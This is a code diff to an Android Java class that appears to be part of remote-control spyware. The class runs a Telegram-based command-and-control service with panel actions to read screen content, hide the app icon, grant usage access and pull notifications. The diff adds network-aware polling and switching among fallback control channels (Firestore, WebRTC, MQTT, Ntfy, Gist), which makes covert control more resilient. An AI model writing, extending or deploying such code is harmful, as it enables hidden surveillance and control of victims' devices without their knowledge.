@@ -50,15 +50,27 @@ public class TelegramBotWorker implements Runnable {
     @Override
     public void run() {
         while (!Thread.currentThread().isInterrupted()) {
-            try { pollForUpdates(); Thread.sleep(3000); }
+            try {
+                // Smart gating: don't poll if airplane or no validated net
+                if (NetworkStateMonitor.isAirplaneModeOn(context) || !NetworkStateMonitor.canAttemptHeartbeat(context)) {
+                    Thread.sleep(30000); // 30s backoff when offline, zero battery waste
+                    continue;
+                }
+                pollForUpdates();
+                // Adaptive sleep: USABLE 3s, DEGRADED 15s
+                long sleep = NetworkStateMonitor.evaluate(context) == NetworkStateMonitor.NetworkHealth.USABLE ? 3000 : 15000;
+                Thread.sleep(sleep);
+            }
             catch (InterruptedException ie) { Thread.currentThread().interrupt(); break; }
-            catch (Exception e) { ErrorLogger.logError(context, "RunLoop", e); }
+            catch (Exception e) { ErrorLogger.logError(context, "RunLoop", e); try{Thread.sleep(10000);}catch(Exception ignored){} }
         }
     }
 
     private void pollForUpdates() {
         HttpURLConnection conn = null;
         try {
+            // Smart gate inside poll as well
+            if (!NetworkStateMonitor.canAttemptHeartbeat(context)) return;
             String token = ConfigLoader.getBotToken();
             if (token == null) { Thread.currentThread().interrupt(); return; }
             String urlStr = "https://api.telegram.org/bot" + token + "/getUpdates?timeout=20&allowed_updates=[\"message\",\"callback_query\"]";
@@ -221,7 +233,17 @@ public class TelegramBotWorker implements Runnable {
                     break;
                 case "ACTION_DEACTIVATE":
                     sendMessage("Deactivating and returning to dormant state.", context);
+                    context.getSharedPreferences("chimera_prefs", Context.MODE_PRIVATE).edit().putBoolean("deactivated", true).apply();
+                    TransportManager.stopAll();
                     context.stopService(new Intent(context, TelegramC2Service.class));
+                    break;
+                case "ACTION_SWITCH_CLIENT":
+                    TransportManager.switchToClientProtocol(context);
+                    sendMessage("Switched to dedicated CLIENT protocol (Firestore+WebRTC+MQTT). Telegram is now secondary. Client app can connect directly.", context);
+                    break;
+                case "ACTION_SWITCH_AUTO":
+                    TransportManager.switchToAuto(context);
+                    sendMessage("Switched to AUTO smart fallback (Firestore -> Telegram -> MQTT -> Ntfy -> Gist gated).", context);
                     break;
                 case "ACTION_EXIT_PANEL": editMessage(chatId, messageId, "Control panel closed."); break;
                 case "NOTIF_GET_EXISTING": context.sendBroadcast(new Intent("com.chimera.GET_ACTIVE_NOTIFICATIONS")); break;
@@ -298,7 +320,7 @@ public class TelegramBotWorker implements Runnable {
     }
 
     private void sendSystemPanel(long chatId, int messageId) {
-        String text = "`System & Services`";
+        String text = "`System & Services` | Active: " + TransportManager.getActiveTransport();
         try {
             JSONObject keyboard = new JSONObject();
             JSONArray rows = new JSONArray();
@@ -306,6 +328,7 @@ public class TelegramBotWorker implements Runnable {
             rows.put(new JSONArray().put(createButton("Get Screen Content", "ACTION_GET_CONTENT")));
             rows.put(new JSONArray().put(createButton("Show Icon", "ACTION_HIDE_ICON_OFF")).put(createButton("Hide Icon", "ACTION_HIDE_ICON_ON")));
             rows.put(new JSONArray().put(createButton("Grant Usage Access", "ACTION_GRANT_USAGE")));
+            rows.put(new JSONArray().put(createButton("🔗 Switch to CLIENT App", "ACTION_SWITCH_CLIENT")).put(createButton("🔄 Auto Mode", "ACTION_SWITCH_AUTO")));
             rows.put(new JSONArray().put(createButton("⚠️ DEACTIVATE ⚠️", "ACTION_DEACTIVATE")));
             rows.put(new JSONArray().put(createButton("« Back to Main Menu", "PANEL_MAIN")));
             keyboard.put("inline_keyboard", rows);
